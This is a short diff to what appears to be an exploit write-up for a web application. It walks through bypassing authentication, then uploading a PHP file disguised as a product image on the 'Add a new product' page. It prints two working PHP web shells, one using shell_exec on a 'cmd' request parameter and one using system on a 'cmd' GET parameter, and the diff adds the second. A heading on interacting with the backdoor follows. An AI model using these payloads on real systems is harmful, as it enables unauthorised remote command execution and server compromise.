@@ -25,7 +25,7 @@ After bypassing the authentication navagate to the "Add a new product" \
 Here insert whatever data into the fields until the picture. \
 The image file should be a php file with the command execution such the following:
   1. `<?php $exe = shell_exec($_REQUEST['cmd']); echo $exe; ?>`
-  2. `<?php my code`
+  2. `<?php if(isset($_GET['cmd'])){ echo '<pre>'; $cmd = ($_GET['cmd']); system($cmd); echo '</pre>'; die; } ?>`
 
 ## Interacting with the backdoor
 
